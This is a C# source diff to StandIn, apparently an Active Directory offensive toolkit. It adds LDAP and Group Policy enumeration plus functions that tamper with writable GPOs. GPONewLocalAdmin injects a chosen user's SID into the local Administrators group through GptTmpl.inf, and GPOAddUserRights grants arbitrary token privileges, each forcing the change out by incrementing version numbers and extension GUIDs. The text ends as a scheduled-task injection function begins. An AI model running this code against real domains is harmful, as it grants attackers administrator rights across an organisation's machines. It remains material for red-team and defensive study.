@@ -7,12 +7,15 @@ using System.DirectoryServices.AccountManagement;
 using System.Net;
 using System.Security.AccessControl;
 using System.Security.Principal;
+using System.Collections.Generic;
+using System.IO;
+using System.Text.RegularExpressions;
 
 namespace StandIn
 {
     class Program
     {
-        public static void returnObject(String sObject, String sDomain = "", String sUser = "", String sPass = "")
+        public static void returnObject(String sObject, String sDomain = "", String sUser = "", String sPass = "", String sFilter = "")
         {
             // Create searcher
             hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
@@ -52,9 +55,26 @@ namespace StandIn
 
                     // retrieve object properties
                     ResultPropertyCollection omProps = sr.Properties;
-                    Console.WriteLine("\n[?] Iterating object properties\n");
+                    List<String> lFilterProperties = new List<String>();
+                    if (!String.IsNullOrEmpty(sFilter))
+                    {
+                        Console.WriteLine("\n[?] Iterating object properties");
+                        Console.WriteLine("    |_ Applying property filter => " + sFilter + "\n");
+                        Array.ForEach(sFilter.Split(','), e => lFilterProperties.Add(e.Trim()));
+                    } else
+                    {
+                        Console.WriteLine("\n[?] Iterating object properties\n");
+                    }
                     foreach (String sKey in omProps.PropertyNames)
                     {
+                        if (lFilterProperties.Count > 0)
+                        {
+                            if (!lFilterProperties.Contains(sKey))
+                            {
+                                continue;
+                            }
+                        }
+
                         Console.WriteLine("[+] " + sKey);
                         if (sKey == "objectsid")
                         {
@@ -135,6 +155,19 @@ namespace StandIn
                                 Console.WriteLine("    |_ " + omProps[sKey][0]);
                             }
                         }
+                        else if (sKey == "versionnumber")
+                        {
+                            try
+                            {
+                                hStandIn.GPOVersion gpov = hStandIn.UInt32ToGPOVersion((UInt32)Int32.Parse(omProps[sKey][0].ToString()));
+                                Console.WriteLine("    |_ User Version     : " + gpov.iUserVersion);
+                                Console.WriteLine("    |_ Computer Version : " + gpov.iComputerVersion);
+                            }
+                            catch
+                            {
+                                Console.WriteLine("    |_ " + omProps[sKey][0]);
+                            }
+                        }
                         else
                         {
                             foreach (Object oColl in omProps[sKey])
@@ -155,6 +188,1158 @@ namespace StandIn
             } catch
             {
                 Console.WriteLine("[!] Failed to enumerate object properties..");
+                return;
+            }
+        }
+
+        public static void returnLDAP(String sLDAP, String sDomain = "", String sUser = "", String sPass = "", String sFilter = "", UInt32 iLimit = 0)
+        {
+            // Create searcher
+            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
+            if (!so.success)
+            {
+                Console.WriteLine("[!] Failed to create directory searcher..");
+                return;
+            }
+            DirectorySearcher ds = so.searcher;
+
+            // Search filter
+            ds.Filter = sLDAP;
+
+            // Enum
+            try
+            {
+                // Search
+                SearchResultCollection oObject = ds.FindAll();
+
+                // Did we get at least 1 result back?
+                if (oObject.Count == 0)
+                {
+                    Console.WriteLine("[!] LDAP search did not return any results..");
+                    return;
+                }
+
+                // Search details
+                if (iLimit == 0)
+                {
+                    // If unspecified == 50
+                    iLimit = 50;
+                }
+                Console.WriteLine("[+] LDAP search result count : " + oObject.Count);
+                Console.WriteLine("    |_ Result limit          : " + iLimit);
+
+                List<String> lFilterProperties = new List<String>();
+                if (!String.IsNullOrEmpty(sFilter))
+                {
+                    Console.WriteLine("\n[?] Iterating result properties");
+                    Console.WriteLine("    |_ Applying property filter => " + sFilter);
+                    Array.ForEach(sFilter.Split(','), e => lFilterProperties.Add(e.Trim()));
+                }
+                else
+                {
+                    Console.WriteLine("\n[?] Iterating result properties");
+                }
+
+                // Get object details
+                foreach (SearchResult sr in oObject)
+                {
+                    DirectoryEntry mde = sr.GetDirectoryEntry();
+                    Console.WriteLine("\n[?] Object   : " + mde.Name);
+                    Console.WriteLine("    Path     : " + mde.Path);
+
+                    // retrieve object properties
+                    ResultPropertyCollection omProps = sr.Properties;
+                    foreach (String sKey in omProps.PropertyNames)
+                    {
+                        if (lFilterProperties.Count > 0)
+                        {
+                            if (!lFilterProperties.Contains(sKey))
+                            {
+                                continue;
+                            }
+                        }
+
+                        Console.WriteLine("[+] " + sKey);
+                        if (sKey == "objectsid")
+                        {
+                            Console.WriteLine("    |_ " + new SecurityIdentifier((Byte[])omProps[sKey][0], 0).ToString());
+                        }
+                        else if (sKey == "objectguid")
+                        {
+                            Console.WriteLine("    |_ " + new Guid((Byte[])omProps[sKey][0]).ToString());
+                        }
+                        else if (
+                            sKey == "pwdlastset" ||
+                            sKey == "lastlogon" ||
+                            sKey == "lastlogontimestamp" ||
+                            sKey == "accountexpires" ||
+                            sKey == "lastLogoff" ||
+                            sKey == "badpasswordtime")
+                        {
+                            long kerbTime = (long)omProps[sKey][0];
+                            if (kerbTime == long.MaxValue)
+                            {
+                                Console.WriteLine("    |_ 0x7FFFFFFFFFFFFFFF");
+                            }
+                            else if (kerbTime == 0)
+                            {
+                                Console.WriteLine("    |_ 0x0");
+                            }
+                            else
+                            {
+                                Console.WriteLine("    |_ " + DateTime.FromFileTimeUtc((long)omProps[sKey][0]) + " UTC");
+                            }
+                        }
+                        else if (sKey == "msds-allowedtoactonbehalfofotheridentity")
+                        {
+                            RawSecurityDescriptor rsd = new RawSecurityDescriptor((Byte[])omProps[sKey][0], 0);
+                            foreach (CommonAce ace in rsd.DiscretionaryAcl)
+                            {
+                                Console.WriteLine("    |_ BinLen           : " + ace.BinaryLength);
+                                Console.WriteLine("    |_ AceQualifier     : " + ace.AceQualifier.ToString());
+                                Console.WriteLine("    |_ IsCallback       : " + ace.IsCallback);
+                                Console.WriteLine("    |_ OpaqueLength     : " + ace.OpaqueLength);
+                                Console.WriteLine("    |_ AccessMask       : " + ace.AccessMask);
+                                Console.WriteLine("    |_ SID              : " + ace.SecurityIdentifier.ToString());
+                                Console.WriteLine("    |_ AceType          : " + ace.AceType.ToString());
+                                Console.WriteLine("    |_ AceFlags         : " + ace.AceFlags);
+                                Console.WriteLine("    |_ IsInherited      : " + ace.IsInherited);
+                                Console.WriteLine("    |_ InheritanceFlags : " + ace.InheritanceFlags);
+                                Console.WriteLine("    |_ PropagationFlags : " + ace.PropagationFlags);
+                                Console.WriteLine("    |_ AuditFlags       : " + ace.AceFlags);
+                            }
+                        }
+                        else if (sKey == "useraccountcontrol")
+                        {
+                            try
+                            {
+                                Console.WriteLine("    |_ " + (hStandIn.USER_ACCOUNT_CONTROL)omProps[sKey][0]);
+                            }
+                            catch
+                            {
+                                Console.WriteLine("    |_ " + omProps[sKey][0]);
+                            }
+                        }
+                        else if (sKey == "samaccounttype")
+                        {
+                            try
+                            {
+                                Console.WriteLine("    |_ " + (hStandIn.SAM_ACCOUNT_TYPE)omProps[sKey][0]);
+                            }
+                            catch
+                            {
+                                Console.WriteLine("    |_ " + omProps[sKey][0]);
+                            }
+                        }
+                        else if (sKey == "msds-supportedencryptiontypes")
+                        {
+                            try
+                            {
+                                Console.WriteLine("    |_ " + (hStandIn.SUPPORTED_ETYPE)omProps[sKey][0]);
+                            }
+                            catch
+                            {
+                                Console.WriteLine("    |_ " + omProps[sKey][0]);
+                            }
+                        }
+                        else if (sKey == "versionnumber")
+                        {
+                            try
+                            {
+                                hStandIn.GPOVersion gpov = hStandIn.UInt32ToGPOVersion((UInt32)Int32.Parse(omProps[sKey][0].ToString()));
+                                Console.WriteLine("    |_ User Version     : " + gpov.iUserVersion);
+                                Console.WriteLine("    |_ Computer Version : " + gpov.iComputerVersion);
+                            }
+                            catch
+                            {
+                                Console.WriteLine("    |_ " + omProps[sKey][0]);
+                            }
+                        }
+                        else
+                        {
+                            foreach (Object oColl in omProps[sKey])
+                            {
+                                if (oColl is byte[])
+                                {
+                                    Console.WriteLine("    |_ " + BitConverter.ToString((Byte[])oColl).Replace("-", " "));
+                                }
+                                else
+                                {
+                                    Console.WriteLine("    |_ " + oColl);
+                                }
+                            }
+                        }
+                    }
+
+                    // Should we exit?
+                    iLimit -= 1;
+                    if (iLimit == 0)
+                    {
+                        break;
+                    }
+                }
+            }
+            catch
+            {
+                Console.WriteLine("[!] Failed to run LDAP query..");
+                return;
+            }
+        }
+
+        public static void returnGPOs(String sDomain = "", String sUser = "", String sPass = "", String sFilter = "", UInt32 iLimit = 0, Boolean bACL = false)
+        {
+            // Create searcher
+            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
+            if (!so.success)
+            {
+                Console.WriteLine("[!] Failed to create directory searcher..");
+                return;
+            }
+            DirectorySearcher ds = so.searcher;
+
+            // Search filter
+            if (String.IsNullOrEmpty(sFilter))
+            {
+                ds.Filter = "(&(displayName=*)(gpcfilesyspath=*))";
+            } else
+            {
+                ds.Filter = String.Format("(&(gpcfilesyspath=*)(|(displayName=*{0}*)(displayName={0}*)(displayName=*{0})))", sFilter);
+            }
+
+            // Enum
+            try
+            {
+                // Search
+                SearchResultCollection oObject = ds.FindAll();
+
+                // Did we get at least 1 result back?
+                if (oObject.Count == 0)
+                {
+                    Console.WriteLine("[!] LDAP search did not return any results..");
+                    return;
+                }
+
+                // Search details
+                if (iLimit == 0)
+                {
+                    // If unspecified == 50
+                    iLimit = 50;
+                }
+                Console.WriteLine("[+] GPO result count         : " + oObject.Count);
+                Console.WriteLine("    |_ Result limit          : " + iLimit);
+                if (!String.IsNullOrEmpty(sFilter))
+                {
+                    Console.WriteLine("    |_ Applying search filter");
+                }
+
+                // Get object details
+                foreach (SearchResult sr in oObject)
+                {
+                    DirectoryEntry mde = sr.GetDirectoryEntry();
+                    ResultPropertyCollection omProps = sr.Properties;
+
+                    Console.WriteLine("\n[?] Object   : " + mde.Name);
+                    Console.WriteLine("    Path     : " + mde.Path);
+
+                    if (bACL)
+                    {
+                        Console.WriteLine("    GPCFilesysPath : " + omProps["gpcfilesyspath"][0].ToString());
+                        if (Directory.Exists(omProps["gpcfilesyspath"][0].ToString()))
+                        {
+                            Console.WriteLine("    Path           : OK");
+                            try
+                            {
+                                DirectoryInfo di = new DirectoryInfo(omProps["gpcfilesyspath"][0].ToString());
+                                DirectorySecurity dse = di.GetAccessControl(AccessControlSections.Access);
+                                foreach (FileSystemAccessRule fsar in dse.GetAccessRules(true, true, typeof(NTAccount)))
+                                {
+                                    Console.WriteLine("\n[+] Account       : " + fsar.IdentityReference.Value);
+                                    Console.WriteLine("    Type          : " + fsar.AccessControlType);
+                                    Console.WriteLine("    Rights        : " + fsar.FileSystemRights);
+                                    Console.WriteLine("    Inherited ACE : " + fsar.IsInherited);
+                                    Console.WriteLine("    Propagation   : " + fsar.PropagationFlags);
+                                }
+                            } catch
+                            {
+                                Console.WriteLine("    Error          : Access Denied");
+                            }
+                        } else
+                        {
+                            Console.WriteLine("    Path           : Not found");
+                        }
+                    } else
+                    {
+                        // retrieve object properties
+                        Console.WriteLine("    DisplayName              : " + omProps["displayname"][0].ToString());
+                        Console.WriteLine("    CN                       : " + omProps["cn"][0].ToString());
+                        Console.WriteLine("    GPCFilesysPath           : " + omProps["gpcfilesyspath"][0].ToString());
+                        try
+                        {
+                            Console.WriteLine("    GPCMachineExtensionnames : " + omProps["gpcmachineextensionnames"][0].ToString());
+                        }
+                        catch
+                        {
+                            Console.WriteLine("    GPCMachineExtensionnames : ");
+                        }
+                        Console.WriteLine("    WhenCreated              : " + omProps["whencreated"][0].ToString());
+                        Console.WriteLine("    WhenChanged              : " + omProps["whenchanged"][0].ToString());
+                    }
+                    // Should we exit?
+                    iLimit -= 1;
+                    if (iLimit == 0)
+                    {
+                        break;
+                    }
+                }
+            }
+            catch
+            {
+                Console.WriteLine("[!] Failed to retrieve GPOs..");
+                return;
+            }
+        }
+
+        public static void GPONewLocalAdmin(String sGPOName, String sSamAccountName, String sDomain = "", String sUser = "", String sPass = "")
+        {
+            // Create searcher
+            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
+            if (!so.success)
+            {
+                Console.WriteLine("[!] Failed to create directory searcher..");
+                return;
+            }
+            DirectorySearcher ds = so.searcher;
+
+            // Search filter
+            ds.Filter = String.Format("(&(gpcfilesyspath=*)(displayName={0}))", sGPOName);
+
+            // Enum
+            try
+            {
+                // Search
+                SearchResultCollection oObject = ds.FindAll();
+
+                // Did we get at least 1 result back?
+                if (oObject.Count == 0)
+                {
+                    Console.WriteLine("\n[!] LDAP search did not return any results..");
+                    return;
+                }
+                else if (oObject.Count > 1)
+                {
+                    Console.WriteLine("\n[!] LDAP search returned more than one result..");
+                    return;
+                }
+
+                SearchResult dirGPOObject = oObject[0];
+                DirectoryEntry mde = dirGPOObject.GetDirectoryEntry();
+                ResultPropertyCollection omProps = dirGPOObject.Properties;
+
+                String sGPOPath = omProps["gpcfilesyspath"][0].ToString();
+                Console.WriteLine("\n[+] GPO Object Found");
+                Console.WriteLine("    Object   : " + mde.Name);
+                Console.WriteLine("    Path     : " + mde.Path);
+                Console.WriteLine("    GP Path  : " + sGPOPath);
+
+                ds.Filter = String.Format("(samaccountname={0})", sSamAccountName);
+                SearchResult userObject = null;
+                try
+                {
+                    userObject = ds.FindOne();
+                }
+                catch
+                {
+                    Console.WriteLine("\n[!] LDAP search failed..");
+                    return;
+                }
+
+                if (userObject == null)
+                {
+                    Console.WriteLine("\n[!] samAccountName did not resolve to identity..");
+                    return;
+                }
+                DirectoryEntry umde = userObject.GetDirectoryEntry();
+                ResultPropertyCollection uomProps = userObject.Properties;
+
+                Console.WriteLine("\n[+] User Object Found");
+                Console.WriteLine("    Object   : " + umde.Name);
+                Console.WriteLine("    Path     : " + umde.Path);
+                Console.WriteLine("    SID      : " + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString());
+
+                // Read GPO version information
+                hStandIn.GPOVersion oGPOVer = hStandIn.UInt32ToGPOVersion((UInt32)Int32.Parse(omProps["versionnumber"][0].ToString()));
+                Console.WriteLine("\n[?] GPO Version");
+                Console.WriteLine("    User     : " + oGPOVer.iUserVersion);
+                Console.WriteLine("    Computer : " + oGPOVer.iComputerVersion);
+
+                if (!Directory.Exists(sGPOPath))
+                {
+                    Console.WriteLine("\n[!] GPO path not found..");
+                    return;
+                }
+
+                // Read gpt.ini
+                String sGPT = File.ReadAllText(sGPOPath + @"\gpt.ini");
+                UInt32 iNewGPOVersion = hStandIn.IncrementGPOVersion(oGPOVer, false, true);
+                String sNewGPT = Regex.Replace(sGPT, @"(V|v)ersion=\d+", String.Format("Version={0}", iNewGPOVersion));
+
+                // Check/create relevant path
+                if (!Directory.Exists(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\"))
+                {
+                    try
+                    {
+                        Directory.CreateDirectory(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\");
+                    }
+                    catch
+                    {
+                        Console.WriteLine("\n[!] Failed to create GPO path..");
+                        return;
+                    }
+                }
+
+                Console.WriteLine("\n[+] Writing GPO changes");
+                if (File.Exists(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf"))
+                {
+                    Console.WriteLine("    |_ Updating existing GptTmpl.inf");
+                    String sTmpl = File.ReadAllText(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf");
+
+                    // Create collection object
+                    MatchCollection mc;
+
+                    // Does it contain group membership info?
+                    if ((sTmpl.ToLower()).Contains("[group membership]"))
+                    {
+                        Console.WriteLine("       |_ Updating group membership");
+                        mc = Regex.Matches(sTmpl, @"\*(\s|)S-1-5-32-544__Members(\s|)=(.+)");
+                        if (mc.Count == 1)
+                        {
+                            // Check if sid already contained or append?
+                            if ((mc[0].Groups[3].Value).ToLower().Contains((new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString()).ToLower()))
+                            {
+                                Console.WriteLine("       |_ User SID alread part of local admins..");
+                                return;
+                            }
+                            else
+                            {
+                                String sReplace = "*S-1-5-32-544__Members = *" + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString() + "," + (mc[0].Groups[3].Value).Trim() + "\r\n";
+                                sTmpl = Regex.Replace(sTmpl, @"\*(\s|)S-1-5-32-544__Members(\s|)=(.+)", sReplace);
+                            }
+                        }
+                        else
+                        {
+                            // Ok here we just add the group
+                            String sReplace = "[Group Membership]\r\n" +
+                                              "*S-1-5-32-544__Memberof =\r\n" +
+                                              "*S-1-5-32-544__Members = *" + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString();
+                            sTmpl = Regex.Replace(sTmpl, @"\[(G|g)roup (M|m)embership\]", sReplace);
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("       |_ Adding group membership");
+                        sTmpl = sTmpl +
+                                "\r\n[Group Membership]\r\n" +
+                                "*S-1-5-32-544__Memberof =\r\n" +
+                                "*S-1-5-32-544__Members = *" + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString();
+                    }
+
+                    // Update revision
+                    Console.WriteLine("       |_ Updating revision");
+                    mc = Regex.Matches(sTmpl, @"(R|r)evision(\s|=)(\s|)(\d+)");
+                    if (mc.Count == 1)
+                    {
+                        Int64 iRevision = Int64.Parse(mc[0].Groups[4].Value);
+                        iRevision += 1;
+                        sTmpl = Regex.Replace(sTmpl, @"(R|r)evision(\s|=)(\s|)\d+", String.Format("Revision={0}", iRevision));
+                    }
+
+                    File.WriteAllText(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf", sTmpl);
+                }
+                else
+                {
+                    Console.WriteLine("    |_ Creating GptTmpl.inf");
+                    String sGptTemplate = "[Unicode]\r\n" +
+                                          "Unicode=yes\r\n" +
+                                          "[Version]\r\n" +
+                                          "signature=\"$CHICAGO$\"\r\n" +
+                                          "Revision=1\r\n" +
+                                          "[Group Membership]\r\n" +
+                                          "*S-1-5-32-544__Memberof =\r\n" +
+                                          "*S-1-5-32-544__Members = *" + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString();
+
+                    File.WriteAllText(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf", sGptTemplate);
+                }
+
+                Console.WriteLine("    |_ Updating gpt.inf");
+                File.WriteAllText(sGPOPath + @"\gpt.ini", sNewGPT);
+                Console.WriteLine("    |_ Updating AD object");
+                Console.WriteLine("       |_ Incrementing version number");
+                mde.Properties["versionNumber"].Value = (hStandIn.IncrementGPOVersion(oGPOVer, false, true)).ToString();
+
+                // Does exist
+                if (dirGPOObject.Properties.Contains("gPCMachineExtensionNames"))
+                {
+                    Console.WriteLine("       |_ Updating gPCMachineExtensionNames");
+                    String sMachExt = omProps["gPCMachineExtensionNames"][0].ToString();
+                    MatchCollection mc = Regex.Matches(sMachExt, @"\[{?[0-9a-fA-F-]{36}}{?[0-9a-fA-F-]{36}}\]");
+                    if (mc.Count == 0)
+                    {
+                        mde.Properties["gPCMachineExtensionNames"].Value = sMachExt + "[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]";
+                    }
+                    else
+                    {
+                        List<String> lExt = new List<String>();
+                        if (!sMachExt.Contains("[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]"))
+                        {
+                            lExt.Add("[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]");
+                        }
+
+                        lExt.Add(sMachExt);
+
+                        // Build new string
+                        String sNewMachExt = String.Empty;
+                        foreach (String s in lExt)
+                        {
+                            sNewMachExt += s;
+                        }
+                        mde.Properties["gPCMachineExtensionNames"].Value = sNewMachExt;
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("       |_ Creating gPCMachineExtensionNames");
+                    mde.Properties["gPCMachineExtensionNames"].Add("[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]");
+                }
+                mde.CommitChanges();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] Failed modify GPO..");
+                if (ex.InnerException != null)
+                {
+                    Console.WriteLine(ex.InnerException.Message);
+                }
+                else
+                {
+                    Console.WriteLine(ex.Message);
+                }
+                return;
+            }
+        }
+
+        public static void GPOAddUserRights(String sGPOName, String sSamAccountName, String sUserRights, String sDomain = "", String sUser = "", String sPass = "")
+        {
+            // Parse provided GPO rights
+            Console.WriteLine("\n[+] Validating account rights");
+            List<String> lUserRights = new List<String>();
+            void addPrivilege(String sRight, String sIndex)
+            {
+                if (sRight.Trim().ToLower() == sIndex.ToLower()) {
+                    lUserRights.Add(sIndex);
+                }
+            }
+
+            foreach (String s in hStandIn.userTokenRights)
+            {
+                Array.ForEach(sUserRights.Split(','), e =>  addPrivilege(e, s));
+            }
+
+            if (lUserRights.Count == 0)
+            {
+                Console.WriteLine("\n[!] No valid user rights identified..");
+                return;
+            } else
+            {
+                Console.WriteLine("    |_ Rights count: " + lUserRights.Count);
+                foreach (String s in lUserRights)
+                {
+                    Console.WriteLine("       |_ " + s);
+                }
+            }
+
+            // Create searcher
+            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
+            if (!so.success)
+            {
+                Console.WriteLine("\n[!] Failed to create directory searcher..");
+                return;
+            }
+            DirectorySearcher ds = so.searcher;
+
+            // Search filter
+            ds.Filter = String.Format("(&(gpcfilesyspath=*)(displayName={0}))", sGPOName);
+
+            // Enum
+            try
+            {
+                // Search
+                SearchResultCollection oObject = ds.FindAll();
+
+                // Did we get at least 1 result back?
+                if (oObject.Count == 0)
+                {
+                    Console.WriteLine("\n[!] LDAP search did not return any results..");
+                    return;
+                } else if (oObject.Count > 1)
+                {
+                    Console.WriteLine("\n[!] LDAP search returned more than one result..");
+                    return;
+                }
+
+                SearchResult dirGPOObject = oObject[0];
+                DirectoryEntry mde = dirGPOObject.GetDirectoryEntry();
+                ResultPropertyCollection omProps = dirGPOObject.Properties;
+
+                String sGPOPath = omProps["gpcfilesyspath"][0].ToString();
+                Console.WriteLine("\n[+] GPO Object Found");
+                Console.WriteLine("    Object   : " + mde.Name);
+                Console.WriteLine("    Path     : " + mde.Path);
+                Console.WriteLine("    GP Path  : " + sGPOPath);
+
+                ds.Filter = String.Format("(samaccountname={0})", sSamAccountName);
+                SearchResult userObject = null;
+                try
+                {
+                    userObject = ds.FindOne();
+                } catch
+                {
+                    Console.WriteLine("\n[!] LDAP search failed..");
+                    return;
+                }
+                
+                if (userObject == null)
+                {
+                    Console.WriteLine("\n[!] samAccountName did not resolve to identity..");
+                    return;
+                }
+                DirectoryEntry umde = userObject.GetDirectoryEntry();
+                ResultPropertyCollection uomProps = userObject.Properties;
+
+                Console.WriteLine("\n[+] User Object Found");
+                Console.WriteLine("    Object   : " + umde.Name);
+                Console.WriteLine("    Path     : " + umde.Path);
+                Console.WriteLine("    SID      : " + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString());
+
+                // Read GPO version information
+                hStandIn.GPOVersion oGPOVer = hStandIn.UInt32ToGPOVersion((UInt32)Int32.Parse(omProps["versionnumber"][0].ToString()));
+                Console.WriteLine("\n[?] GPO Version");
+                Console.WriteLine("    User     : " + oGPOVer.iUserVersion);
+                Console.WriteLine("    Computer : " + oGPOVer.iComputerVersion);
+
+                if (!Directory.Exists(sGPOPath))
+                {
+                    Console.WriteLine("\n[!] GPO path not found..");
+                    return;
+                }
+
+                // Read gpt.ini
+                String sGPT = File.ReadAllText(sGPOPath + @"\gpt.ini");
+                UInt32 iNewGPOVersion = hStandIn.IncrementGPOVersion(oGPOVer, false, true);
+                String sNewGPT = Regex.Replace(sGPT, @"(V|v)ersion=\d+", String.Format("Version={0}", iNewGPOVersion));
+
+                // Check/create relevant path
+                if (!Directory.Exists(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\"))
+                {
+                    try
+                    {
+                        Directory.CreateDirectory(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\");
+                    } catch
+                    {
+                        Console.WriteLine("\n[!] Failed to create GPO path..");
+                        return;
+                    }
+                }
+
+                Console.WriteLine("\n[+] Writing GPO changes");
+                if (File.Exists(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf"))
+                {
+                    Console.WriteLine("    |_ Updating existing GptTmpl.inf");
+                    String sTmpl = File.ReadAllText(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf");
+
+                    // Create collection object
+                    MatchCollection mc;
+
+                    // Does it contain group membership info?
+                    UInt32 iCount = 0;
+                    if ((sTmpl.ToLower()).Contains("[privilege rights]"))
+                    {
+                        Console.WriteLine("       |_ Updating GPO Privileges");
+                        // Loop rights
+                        foreach (String sRight in lUserRights)
+                        {
+                            mc = Regex.Matches(sTmpl, @"(\s|)" + sRight + @"(\s|)=(.+)");
+                            if (mc.Count == 1)
+                            {
+                                // Check if sid already contained or append?
+                                if ((mc[0].Groups[3].Value).ToLower().Contains((new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString()).ToLower()))
+                                {
+                                    Console.WriteLine("       |_ User SID already has " + sRight + "..");
+                                }
+                                else
+                                {
+                                    String sReplace = sRight + " = *" + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString() + "," + (mc[0].Groups[3].Value).Trim() + "\r\n";
+                                    sTmpl = Regex.Replace(sTmpl, @"(\s|)" + sRight + @"(\s|)=(.+)", sReplace);
+                                    iCount += 1;
+                                }
+                            }
+                            else
+                            {
+                                // Ok here we just add the priv
+                                String sReplace = "[Privilege Rights]\r\n" +
+                                                  sRight + " = *" + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString();
+                                sTmpl = Regex.Replace(sTmpl, @"\[(P|p)rivilege (R|r)ights\]", sReplace);
+                                iCount += 1;
+                            }
+                        }
+                    } else
+                    {
+                        Console.WriteLine("       |_ Adding GPO Privileges");
+                        sTmpl = sTmpl + "\r\n[Privilege Rights]\r\n";
+                        foreach (String s in lUserRights)
+                        {
+                            sTmpl += s + " = *" + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString() + "\r\n";
+                            iCount += 1;
+                        }
+                    }
+
+                    // No new privileges were added
+                    if (iCount == 0)
+                    {
+                        return;
+                    }
+
+                    // Update revision
+                    Console.WriteLine("       |_ Updating revision");
+                    mc = Regex.Matches(sTmpl, @"(R|r)evision(\s|=)(\s|)(\d+)");
+                    if (mc.Count == 1)
+                    {
+                        Int64 iRevision = Int64.Parse(mc[0].Groups[4].Value);
+                        iRevision += 1;
+                        sTmpl = Regex.Replace(sTmpl, @"(R|r)evision(\s|=)(\s|)\d+", String.Format("Revision={0}", iRevision));
+                    }
+
+                    File.WriteAllText(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf", sTmpl);
+                } else
+                {
+                    Console.WriteLine("    |_ Creating GptTmpl.inf");
+                    String sGptTemplate = "[Unicode]\r\n" +
+                                          "Unicode=yes\r\n" +
+                                          "[Version]\r\n" +
+                                          "signature=\"$CHICAGO$\"\r\n" +
+                                          "Revision=1\r\n" +
+                                          "[Privilege Rights]\r\n";
+                    foreach (String s in lUserRights)
+                    {
+                        sGptTemplate += s + " = *" + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString() + "\r\n";
+                    }
+
+                    File.WriteAllText(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf", sGptTemplate);
+                }
+
+                Console.WriteLine("    |_ Updating gpt.inf");
+                File.WriteAllText(sGPOPath + @"\gpt.ini", sNewGPT);
+                Console.WriteLine("    |_ Updating AD object");
+                Console.WriteLine("       |_ Incrementing version number");
+                mde.Properties["versionNumber"].Value = (hStandIn.IncrementGPOVersion(oGPOVer, false, true)).ToString();
+
+                // Does exist
+                if (dirGPOObject.Properties.Contains("gPCMachineExtensionNames"))
+                {
+                    Console.WriteLine("       |_ Updating gPCMachineExtensionNames");
+                    String sMachExt = omProps["gPCMachineExtensionNames"][0].ToString();
+                    MatchCollection mc = Regex.Matches(sMachExt, @"\[{?[0-9a-fA-F-]{36}}{?[0-9a-fA-F-]{36}}\]");
+                    if (mc.Count == 0)
+                    {
+                        mde.Properties["gPCMachineExtensionNames"].Value = sMachExt + "[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]";
+                    } else
+                    {
+                        List<String> lExt = new List<String>();
+                        if (!sMachExt.Contains("[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]"))
+                        {
+                            lExt.Add("[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]");
+                        }
+
+                        lExt.Add(sMachExt);
+
+                        // Build new string
+                        String sNewMachExt = String.Empty;
+                        foreach (String s in lExt)
+                        {
+                            sNewMachExt += s;
+                        }
+                        mde.Properties["gPCMachineExtensionNames"].Value = sNewMachExt;
+                    }
+                } else
+                {
+                    Console.WriteLine("       |_ Creating gPCMachineExtensionNames");
+                    mde.Properties["gPCMachineExtensionNames"].Add("[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]");
+                }
+                mde.CommitChanges();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] Failed modify GPO..");
+                if (ex.InnerException != null)
+                {
+                    Console.WriteLine(ex.InnerException.Message);
+                }
+                else
+                {
+                    Console.WriteLine(ex.Message);
+                }
+                return;
+            }
+        }
+
+        public static void GPOAddImmediateTask(String sGPOName, String sTaskType, String sAuthor, String sCommand, String sTaskName = "", String sArgs = "", String sTarget = "", String sTargetSID = "", String sDomain = "", String sUser = "", String sPass = "")
+        {
+            // Setup
+            String sTaskPath = String.Empty;
+            if (sTaskType.ToLower() == "user")
+            {
+                sTaskType = "user";
+                sTaskPath = @"\User\Preferences\ScheduledTasks\";
